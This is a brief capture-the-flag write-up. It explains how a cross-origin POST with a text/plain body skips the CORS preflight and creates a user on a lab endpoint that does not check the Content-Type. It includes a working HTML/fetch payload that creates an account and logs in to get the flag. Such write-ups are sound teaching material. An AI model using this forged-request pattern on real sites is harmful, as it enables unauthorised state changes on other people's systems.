cors-light
======================

The `POST /chal2/create-user` endpoint reads a JSON body and creates a row in a shared `users_chal2` table.

The endpoint doesn't set `Access-Control-Allow-*` headers, so a cross-origin script can't read the response. But importantly, even if we can't read the response the request is still sent to the server, so the user will still be created.

Another issue is that endpoint accepts JSON input, which is a complex request and must be pre-flighted with an OPTIONS request. However, the server never validates the Content-Type header, so we can use the default `text/plain` content type (which doesn't require a preflight) in order to reach the endpoint.

```html
<script>
  fetch("http://app.example.com/chal2/create-user", {
    method: "POST",
    body: JSON.stringify({
      username: "jlkqb7b",
      password: "ty3gqnk",
    }),
  });

  fetch("http://app.example.com/chal2/login", {
    method: "POST",
    body: new URLSearchParams({ username: "jlkqb7b", password: "ty3gqnk" }),
  })
    .then((r) => r.text())
    .then((t) => console.log(t));
</script>
```

Once we successfully created the user, we can log in and view the flag.

